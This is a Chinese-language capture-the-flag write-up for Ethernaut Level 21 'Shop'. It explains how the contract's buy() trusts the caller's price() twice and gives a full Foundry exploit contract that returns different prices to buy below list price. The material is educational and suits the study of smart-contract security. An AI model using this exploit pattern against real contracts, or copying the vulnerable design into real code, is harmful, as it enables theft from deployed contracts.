# Level 21 - Shop
## 題目
[Shop](https://ethernaut.openzeppelin.com/level/0x691eeA9286124c043B82997201E805646b76351a)

### 通關條件
合約可以以任何他們想要的方式操縱其他合約所看到的數據。
基於外部和不受信任的合約邏輯來改變狀態是不安全的。
### 合約內容
``` solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
## 解題
這題題目沒有說的很具體，簡單來說這是一個購物合約，我們的目標就是用比定價更低的價格購買到商品。那首先看題目合約中執行購買動作的 `buy()`
``` solidity=12
function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
        isSold = true;
        price = _buyer.price();
    }
}
```
12 行可以看到呼叫合約購買時，會先將以呼叫的地址（`msg.sender`）創建一個新的 `Buyer` 合約。接著 15 行判斷 `_buyer` 是否有足夠的金額和商品是否售出，如果判斷通過會將售出狀態更新，以及把價格修改為購買價格（我猜他是用這個數字有沒有比初始價格 100 還要低去判斷是否通關的）。那 15 行在判斷金額的時候會呼叫 `_buyer.price()`，在第 4 行可以看到他是以介面的方式去創建 `Buyer` 合約
``` solidity=4
interface Buyer {
    function price() external view returns (uint256);
}
```
也就是說，我們只要在自己的地址實作 `Buyer.price()` 合約即可。實作 `price()` 的時候要考慮到最後要把題目合約裡的 `price` 變小（17 行），但是又要通過第 15 行的判斷。這裡使用的技巧跟解 [Level 11 - Elevator](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2) 一樣，只要讓 `price()` 兩次回傳的數值不一樣即可，15-17 行可以發現 `_buyer.price()` 被呼叫的兩次中間有 `isSold = true` 這句去修改售出狀態，我們可以利用這個變數去判斷現在應該要回傳大於 `price` 還是小於 `price` 的值。
```solidity
function price() external view returns (uint){
    return level21.isSold() == true ? 1: 101; 
}
```
實作完介面要求之後，這題就可以順利過關了，攻擊合約如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/21_Shop.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();
        ShopAttacker shopAttacker = new ShopAttacker(your_challenge_address);
        shopAttacker.attack();
        vm.stopBroadcast();
    }
}

contract ShopAttacker {
    Shop public level21;

    constructor(address _target) {
        level21 = Shop(_target);
    }

    function attack() public{
        level21.buy();
    }

    function price() external view returns (uint){
        return level21.isSold() == true ? 1: 101; 
    }
}
```